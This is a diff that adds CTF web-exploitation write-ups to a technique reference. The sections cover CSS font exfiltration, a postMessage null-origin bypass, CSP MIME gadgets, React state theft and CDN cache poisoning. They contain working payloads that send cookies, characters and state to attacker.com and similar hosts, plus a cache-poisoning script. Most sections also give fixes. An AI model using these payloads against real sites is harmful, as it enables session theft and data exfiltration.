@@ -18,6 +18,11 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
 - [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
 - [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
+- [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
+- [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
+- [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
+- [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
+- [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)
 
 ---
 
@@ -508,3 +513,227 @@ def find_collision(target_str):
 **Key insight:** Java `hashCode()` produces trivial collisions due to its simple polynomial structure and 32-bit overflow. Never use it for security-sensitive comparisons (passwords, tokens, signatures). The collision space is dense — for most hash values, many short colliding strings exist. Use `hashCode()` only for hash table bucket assignment, never for equality/authentication checks.
 
 **Detection:** Java source using `password.hashCode() == storedHash`, token comparison via `token.hashCode()`, or any security check using `.hashCode()` instead of `equals()` with a secure hash (bcrypt, PBKDF2, etc.).
+
+---
+
+## CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)
+
+**Pattern:** Define a custom `@font-face` per character with a `unicode-range` that matches exactly one code point. When a headless browser (or admin bot) renders an element containing the target text, the browser fetches a different font URL for each character actually present. The attacker's server logs reveal which characters exist in the target element.
+
+```css
+/* Each @font-face triggers a fetch only if that character exists in .target */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=c'); unicode-range: U+0063; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=1'); unicode-range: U+0031; }
+/* ... one per character in the target alphabet ... */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=_'); unicode-range: U+005F; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; } /* { */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; } /* } */
+
+/* Apply the font to the element containing the secret */
+.target { font-family: exfil; }
+```
+
+```python
+# Generate the full @font-face CSS payload
+import string
+
+charset = string.ascii_lowercase + string.digits + "_{}"
+css_rules = []
+for c in charset:
+    code_point = f"U+{ord(c):04X}"
+    encoded_c = c if c.isalnum() else f"%{ord(c):02X}"
+    css_rules.append(
+        f"@font-face {{ font-family: exfil; "
+        f"src: url('http://attacker.com/leak?c={encoded_c}'); "
+        f"unicode-range: {code_point}; }}"
+    )
+css_rules.append(".target { font-family: exfil; }")
+payload = "\n".join(css_rules)
+
+# Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
+# Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
+# Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
+```
+
+```python
+# Server-side: collect leaked characters
+from flask import Flask, request
+
+app = Flask(__name__)
+leaked_chars = set()
+
+@app.route('/leak')
+def leak():
+    c = request.args.get('c', '')
+    leaked_chars.add(c)
+    print(f"Leaked chars so far: {''.join(sorted(leaked_chars))}")
+    # Return a minimal valid font file (or 404 — the request itself is the leak)
+    return '', 204
+
+app.run(host='0.0.0.0', port=80)
+```
+
+**Limitations and workarounds:**
+```text
+# unicode-range leaks character SET, not order or count
+# Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info
+
+# To recover ordering, combine with CSS positional tricks:
+# 1. Use ::first-letter with a unique font to leak position 1
+# 2. Use text-indent + overflow: hidden tricks to isolate characters
+# 3. Chain with :nth-child selectors if target chars are in separate elements
+```
+
+**Key insight:** CSS `@font-face` with `unicode-range` triggers font fetches only for characters actually present in the target element. Works under strict CSP that blocks scripts but allows `style-src`. Cross-origin CSS must include `Content-Type: text/css`. Leaks character set (not order), so combine with positional CSS tricks if ordering matters. See also the [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026) technique for a more precise CSS-only oracle.
+
+---
+
+### postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)
+
+**Pattern:** When a web application validates `postMessage` origins, a `data:` URI iframe has a `null` origin that bypasses same-origin checks. Many postMessage handlers check `event.origin !== expected` but don't account for `null` origins, allowing injection from a sandboxed context.
+
+**Vulnerable handler pattern:**
+```javascript
+// Target application's message handler:
+window.addEventListener('message', function(event) {
+    // Weak origin check — doesn't handle null origin
+    if (event.origin === 'http://trusted.com' || !event.origin) {
+        // Process message — renders user-controlled HTML/JS
+        document.getElementById('content').innerHTML = event.data.details.sender_username;
+    }
+});
+```
+
+**Exploit via data: URI iframe:**
+```html
+<iframe src="data:text/html,<script>
+var w = window.open('http://target/page');
+setTimeout(function(){
+    w.postMessage({type:'audio', details:{
+        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
+    }, '*');
+}, 1000);
+</script>"></iframe>
+```
+
+**Alternative: sandboxed iframe approach:**
+```html
+<!-- sandbox attribute without allow-same-origin also produces null origin -->
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+    parent.postMessage({type:'audio', details:{
+        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
+    }, '*');
+</script>
+"></iframe>
+```
+
+```python
+# Host the exploit page on attacker server
+exploit_html = '''
+<html><body>
+<iframe src="data:text/html,
+<script>
+var w = window.open('http://target/messages');
+setTimeout(function(){
+    w.postMessage({
+        type: 'audio',
+        details: {
+            sender_username: '<img src=x onerror=fetch(`http://attacker.com/steal?c=`+document.cookie)>'
+        }
+    }, '*');
+}, 1500);
+</script>
+"></iframe>
+</body></html>
+'''
+# Serve this page, then send the URL to the admin bot
+```
+
+**Key insight:** `data:` URI iframes have a `null` origin. Many postMessage handlers check `event.origin !== expected` but don't account for null origins, allowing injection from a sandboxed context. The `sandbox` attribute without `allow-same-origin` also produces a `null` origin. Always test postMessage handlers with `null` origin by using `data:` URIs or sandboxed iframes. The fix is to explicitly reject `null` and empty origins: `if (!event.origin || event.origin === 'null') return;`.
+
+---
+
+## CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)
+
+**Pattern (Mimisbrunnr):** Endpoint `/xss?xss=<payload>&mimis=<mime>` echoes `payload` with an attacker-chosen `Content-Type`. CSP is `script-src 'self'` and `X-Content-Type-Options: nosniff` is set, so normal XSS injection is blocked. But by choosing `mimis=application/javascript` (or Chrome's permissive `jscript`), the same-origin response becomes loadable as a script via `<script src="/xss?...&mimis=jscript">`.
+
+**Exploit:**
+```html
+<!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
+<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
+<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
+```
+- The first request smuggles harmless tokens that also open a block comment (`/*`).
+- The second request closes the comment (`*/`) and runs the real payload.
+- Because both responses come from `self`, `script-src 'self'` is satisfied even though the browser would normally have rejected them for having a different Content-Type without `nosniff`.
+
+**Key insight:** `X-Content-Type-Options: nosniff` stops MIME sniffing, but it does not override a Content-Type that the server itself declares. Any endpoint whose response type is attacker-controlled — even indirectly, via a query param or `Accept` header — is effectively a script gadget under `script-src 'self'`. Block this by hard-coding the `Content-Type` for reflected endpoints and never echoing user input into headers.
+
+**References:** Midnight Sun CTF Finals 2018 — writeup 10258
+
+---
+
+## React Component State Extraction via __reactInternalInstance$ (RCTF 2018)
+
+**Pattern:** XSS on a React-rendered page cannot directly read server-side state, but every DOM node managed by React carries a property named `__reactInternalInstance$<random>` that links back to the React Fiber node. From there, `.return.stateNode.state` (or `.memoizedState` in newer versions) exposes component state that was never serialized into HTML.
+
+**Exfiltration payload:**
+```javascript
+const key = Object.keys(document.querySelector('[data-react-root]'))
+  .find(k => k.startsWith('__reactInternalInstance$'));
+const fiber = document.querySelector('[data-react-root]')[key];
+const state = fiber.return.stateNode.state;
+fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
+```
+
+For React 17+ the property name is `__reactFiber$<random>`, and the path is `.stateNode.memoizedState`. Walk `.return` until you hit a node with `stateNode !== null`.
+
+**Key insight:** React stores component state on the DOM itself for hot-reload and devtools support. XSS within the same document therefore has full read access to props and state, including values that were fetched client-side and never echoed into the markup (auth tokens, private chats, admin panels). Harden dev builds by stripping `__reactFiber$`/`__reactInternalInstance$` attachments in production or by preventing XSS upstream — CSP alone is not enough because the state read happens in JavaScript that CSP already permits.
+
+**References:** RCTF 2018 — writeup 10125
+
+---
+
+## CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)
+
+**Pattern:** Profile page has a stored self-XSS (e.g. attribute injection on a `<select>` `shoesize` field via `tabindex=1 contenteditable autofocus onfocus=...`). Self-XSS alone is useless — the XSS only fires for the owner of the profile. CDN caches by URL extension, not `Content-Type`, so registering a username whose URL ends in `.js` makes the CDN treat `/profile/<user>.js` as a cacheable static JS asset. A single logged-in hit from the attacker's session poisons the shared edge cache: every subsequent visitor — including the challenge admin bot — is served the attacker's authenticated HTML, executing the XSS under the victim's session.
+
+```python
+# 1. Pick a region-matching VM so your cache hits land in the admin's region.
+#    (CloudFlare is region-sharded; colocate with other challenge infra.)
+
+# 2. Register a user whose name ends in .js
+import requests, random
+s = requests.Session()
+s.get('http://target/login')
+user = f'hfs-{random.randint(10**7, 10**8)}.js'
+s.post('http://target/login', data=f'login={user}&password={user}',
+       headers={'Content-Type': 'application/x-www-form-urlencoded'})
+
+# 3. Store self-XSS via the shoesize select attribute injection
+payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
+           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
+raw = (
+  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
+  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
+  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
+  '------B\r\nContent-Disposition: form-data; name="secret"\r\n\r\nasd\r\n'
+  '------B--\r\n'
+)
+s.post(f'http://target/profile/{user}', data=raw,
+       headers={'Content-Type': 'multipart/form-data; boundary=----B'})
+
+# 4. Poison the edge cache: fetch once while logged in
+s.get(f'http://target/profile/{user}')
+
+# 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
+#    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
+```
+
+**Key insight:** CDNs cache by URL path/extension, not response `Content-Type` or `Vary: Cookie`; a `.js` (or `.css`, `.svg`, `.ico`, `.png`) suffix often flips a per-user page into a globally-shared static asset and converts a self-XSS into a wormable stored XSS. Always test whether appending common static extensions yields the *same* authenticated content from an unauthenticated fetch — that is the poisoning primitive. Admin-bot challenges behind CloudFlare are especially vulnerable; once poisoned, the next admin visit executes your payload with their cookies.
+
+**References:** CONFidence CTF 2019 Teaser — Web 50, writeup 13925. Background: [PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning).
